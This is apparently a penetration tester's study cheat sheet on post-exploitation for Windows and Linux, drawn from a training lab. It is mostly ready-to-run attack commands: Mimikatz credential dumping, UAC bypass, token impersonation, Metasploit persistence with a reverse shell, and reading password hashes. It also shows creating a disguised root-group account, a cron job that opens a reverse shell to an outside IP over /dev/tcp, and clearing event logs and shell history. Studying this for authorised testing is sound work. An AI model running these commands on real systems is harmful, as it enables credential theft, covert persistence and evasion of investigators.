<br>

> Post-exploitation is the final phase of the penetration testing process and
consists of the tactics, techniques and procedures that
attackers/adversaries undertake after obtaining initial access on a target
system.

<br>

# Summary

- [[Post-Exploitation#Windows OS|Windows OS]]
	- [[Post-Exploitation#Local Enumeration|Local Enumeration]]
		- [[Post-Exploitation#System Enumeration|System Enumeration]]
		- [[Post-Exploitation#Users/Groups Enumeration|Users/Groups Enumeration]]
		- [[Post-Exploitation#Network Enumeration|Network Enumeration]]
		- [[Post-Exploitation#Services/Processes Enumeration|Services/Processes Enumeration]]
		- [[Post-Exploitation#Automating Local Enumeration|Automating Local Enumeration]]
	- [[Post-Exploitation#Kernel Exploitation|Kernel Exploitation]]
	- [[Post-Exploitation#Bypassing UAC|Bypassing UAC]]
	- [[Post-Exploitation#Impersonate Token|Impersonate Token]]
	- [[Post-Exploitation#Alternate Data Streams|Alternate Data Streams (TO DO !!!)]]
	- [[Post-Exploitation#Windows Credentials Dumping|Windows Credentials Dumping]]
		- [[Post-Exploitation#Unattended Installation|Unattended Installation]]
		- [[Post-Exploitation#Mimikatz (Metasploit)|Mimikatz (Metasploit)]]
		- [[Post-Exploitation#Mimikatz|Mimikatz]]
	- [[Post-Exploitation#Persistence|Persistence]]
		- [[Post-Exploitation#Metasploit|Metasploit]]
		- [[Post-Exploitation#Enabling RDP|Enabling RDP]]
	- [[Post-Exploitation#Windows OS#Clearing Tracks|Clearing Tracks]]
- [[Post-Exploitation#Linux OS|Linux OS]]
	- [[Post-Exploitation#Linux OS#Local Enumeration|Local Enumeration]]
		- [[Post-Exploitation#Linux OS#Local Enumeration#System Enumeration|System Enumeration]]
		- [[Post-Exploitation#Linux OS#Local Enumeration#Users/Groups Enumeration|Users/Groups Enumeration]]
		- [[Post-Exploitation#Linux OS#Local Enumeration#Network Enumeration|Network Enumeration]]
		- [[Post-Exploitation#Linux OS#Local Enumeration#Processes and Cron Jobs|Process and Cronjobs]]
		- [[Post-Exploitation#Linux OS#Local Enumeration#Automating Local Enumeration|Automating Local Enumeration]]
	- [[Post-Exploitation#Linux OS#Privilege Escalation|Privilege Escalation]]
		- [[Post-Exploitation#Linux OS#Kernel Exploits|Kernel Exploits]]
		- [[Post-Exploitation#Linux OS#SUID Binaries|SUID Binaries]]
	- [[Post-Exploitation#Linux OS#Dumping Linux Password Hashes|Dumping Linux Passwords Hashes]]
		- [[Post-Exploitation#Linux OS#Metasploit|Metasploit]]
	- [[Post-Exploitation#Linux OS#Persistence|Persistence]]
		- [[Post-Exploitation#Linux OS#Create new account|Create New Account]]
		- [[Post-Exploitation#Linux OS#Cron Jobs|Cronjobs]]
		- [[Post-Exploitation#Linux OS#SSH Keys|SSH Keys]]


# Windows OS

## Local Enumeration

### System Enumeration

Thanks to Metasploit modules and a remote access to the target, we can enumerate information about :

- Hostname :
```cmd
C:\hfs>hostname
hostname
WIN-OCMKENBTT
```

- Version :
```cmd
systeminfo | findstr "OS"
```

- List mount :
```bash
meterpreter > show_mount
```

- Applied patches :
```bash
# Metasploit Module :
use post/windows/gather/enum_patches

# Shell :
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Antivirus :
```bash
use post/windows/gather/enum_av_excluded
```

### Users/Groups Enumeration

- List privileges : 
```bash
# Metasploit Module :
use post/windows/gather/win_privs

# Shell :
whoami /priv
```

- Logged users :
```bash
# Metasploit Module :
use post/windows/gather/enum_logged_on_users

# Shell :
net users
net user Administrator # To know more about this account
```

- Groups :
```bash
# List groups :
net localgroup

# List members of group :
net localgroup administrators
```

### Network Enumeration

- Network config :
```cmd
ipconfig
ipconfig /all
```

- Routing table :
```cmd
route print
```

- Enumerate computers :
```bash
# Metasploit Module :
use post/windows/gather/enum_computers

# Shell :
arp -a
```

- Enumerate open ports and services :
```cmd
netstat -ano
```

- Enumerate shares :
```bash
use post/windows/gather/enum_shares
```

- Firewall status :
```cmd
netsh firewall show state
```

### Services/Processes Enumeration

- Enumerate installed applications :
```bash
use post/windows/gather/enum_applications
```

- Started services :
```cmd
net start
```

- Processes and Services running :
```cmd
tasklist /SVC
```

- List scheduled task : 
```cmd
schtasks /query /fo LIST [/v]
```

### Automating Local Enumeration

We can use the following tool : [JAWS](https://github.com/411Hall/JAWS)

Copy/paste and upload the script on the target.
Execute the script with : 
```cmd
powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1 -OutputFilename jaws.txt
```



## Privilege Escalation

### Tools

This tools enumerate and check if there are some LPE on the target.

- PrivescCheck (PS Script):
```cmd
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

- WinPEAS (EXE file) :
```cmd
.\winPEASx64.exe
```



## Kernel Exploitation

Some tools to detect vulnerabilities :
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Collection of Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/)

With **Metasploit** : 
```bash
use post/multi/recon/local_exploit_suggester

set SESSION <ID>
```

## Bypassing UAC

> In order to elevate privileges by bypassing **UAC**, you will need access to a user that is a member of the local administrators group.

If you have this error : `System Error 5 has occured.`, **UAC** is probably enabled.

We need to use this Github tool : [UACME](https://github.com/hfiref0x/UACME).

Follow this steps :

1. Find the Windows Version Build :
	```cmd
	systeminfo | findstr "OS"
	```

2. Look on the GitHub repository for the correct key
3. Execute the binary :
```cmd
.\Akagi64.exe <KEY> C:\Temp\backdoor.exe
```

4. Now, we will have more privileges. Migrate to a process executed by `NT AUTHORITY\SYSTEM` :
```bash
meterpreter > ps
-----------------------------------------
---------- A LOT OF PROCESS -------------
-----------------------------------------
meterpreter > migrate <PID>
```


Recommanded keys :
- 33 (Windows 10)
- 23 (Windows 7)

- Writeup : https://medium.com/@kalirudy1807/bypass-uac-with-uacme-0615f3cdb71e

You can also bypass UAC with Metasploit modules : 
- This one is efficient :
```bash
use exploit/windows/local/bypassuac_injection
```

*There are other modules !*

## Impersonate Token

In your meterpreter session, use the Incognito Module :
```bash
meterpreter > load incognito
```

Then, list tokens :
```bash
meterpreter > list_tokens -u
```

Finally, Impersonate the Administrator token :
```bash
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
```

*You may need to migrate.*

## Alternate Data Streams

TO DO

## Windows Credentials Dumping

### Unattended Installation

The Unattended Windows Setup utility will typically utilize one of the following
configuration files that contain user account and system configuration
information:

```bash
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

*Note : The password may be encoded in base64 !*

### Mimikatz (Metasploit)

*Warning: Need high privileges !*

With a meterpreter session :

1) Load Mimikatz :
```bash
meterpreter > load kiwi
```

2) Dump SAM database :
```bash
meterpreter > lsa_dump_sam
```

2) Other :
```bash
meterpreter > help kiwi
```

### Mimikatz

Execute **Mimikatz** :
```cmd
.\mimikatz.exe
```

Check if you have the high privileges :
```cmd
mimikatz # privilege::debug
Privilege '20' OK
```

Dump SAM database :
```cmd
mimikatz # lsadump::sam
```

Dump secret :
```cmd
mimikatz # lsadump::secrets
```

Dump logon passwords :
```cmd
mimikatz # sekurlsa::logonpasswords
```

## Persistence

### Metasploit

Thanks to Metasploit module :
```bash
use exploit/windows/local/persistence_service

set payload windows/meterpreter/reverse_tcp
set SESSION <ID>
```

Then, you just need to setup a handler.

### Enabling RDP

Enable RDP to access on GUI account :
```bash
use post/windows/manage/enable_rdp
```

Then, connect with **xfreerdp** : 
```bash
xfreerdp /u:Administrator /p:<PASSWORD> /v:<IP>
```

## Clearing Tracks

In your meterprerter session, you can clear the Windows Event Log :
```bash
meterpreter > clearev
```

If you have a resource script :
```bash
meterpreter > resource /path/to/rc_file
```


# Linux OS

## Local Enumeration

### System Enumeration

- Distribution information :
```bash
cat /etc/*release
uname -a
```

- Environment variables :
```bash
printenv
env
```

### Users/Groups Enumeration

- Groups :
```bash
groups <USER>
```

- List users :
```bash
cat /etc/passwd | grep -v nologin
```

### Network Enumeration

- List interfaces :
```bash
ifconfig
ip a
```

- Services running :
```bash
netstat -l
netstat # Works on a Meterpreter session
```

- Hosts file :
```bash
cat /etc/hosts
```

- Display other hosts :
```bash
arp -a
arp # Works on a Meterpreter session
```

### Processes and Cron Jobs

> Linux implements task scheduling through a utility called Cron.

- Display the list of scheduled Cron Jobs for the current user :
```bash
student@attackdefense:~$ crontab -l
```

- List Cron Jobs active on the target :
```bash
student@attackdefense:~$ ls -lR /etc/cron.*

student@attackdefense:~$ cat /etc/crontab
```

- List processes :
```bash
ps
ps aux
```

### Automating Local Enumeration

You can use :
- [LinEnum](https://github.com/rebootuser/LinEnum/tree/master) (light)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master)

## Privilege Escalation

The steps are :
- sudo -l
- suid files
- printenv
- cronjob
- uname -a
- netstat -l

- Weak permissions :
```bash
find / -not -type l -perm -o+w
```

### Kernel Exploits

**Tool** : [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

>This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

Upload the `.sh` script on the target and then execute it :
```bash
www-data@ubuntu:/tmp$ chmod +x les.sh

www-data@ubuntu:/tmp$ ./les.sh
```



### SUID Binaries


## Dumping Linux Password Hashes

Interesting files :
- `/etc/passwd` : It contains users information.
- `/etc/shadow` : It contains hashed passwords.

### Metasploit

There are some useful post-exploitation modules :

- post/linux/gather/ecryptfs_creds
- post/linux/gather/enum_psk : **(Credentials such as Access-Point name and Pre-Shared-Key)**
- post/linux/gather/enum_xchat
- post/linux/gather/phpmyadmin_credsteal
- `post/linux/gather/pptpd_chap_secrets` : **(VPN information such as client, server, passwords and IP).**
- post/linux/manage/sshkey_persistence


## Persistence

### Create new account

We will create a new account on the target's machine : 
```bash
# Create user :
useradd -m ftp -s /bin/bash

# Set password :
passwd ftp

# Add to root group :
usermod -aG root ftp

# Change user id (change 1001,1002,...) :
usermod -u 15 ftp
```

*Avoid account name like backdoor-account,root2,...*

### Cron Jobs

- Via Metasploit :
```bash
use exploit/linux/local/cron_persistence
```

- Manually :
```bash
# Create your command :
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.6.244.2/1234 0>&1'" > file
# Then, add to crontab :
crontab -i file
```

### SSH Keys

- Via Metasploit :
```bash
use post/linux/manage/sshkey_persistence
```

## Clearing Tracks

You can clear the history with :
```bash
history -c
```

You can also :
```bash
cat /dev/null > ~/.bash_history
```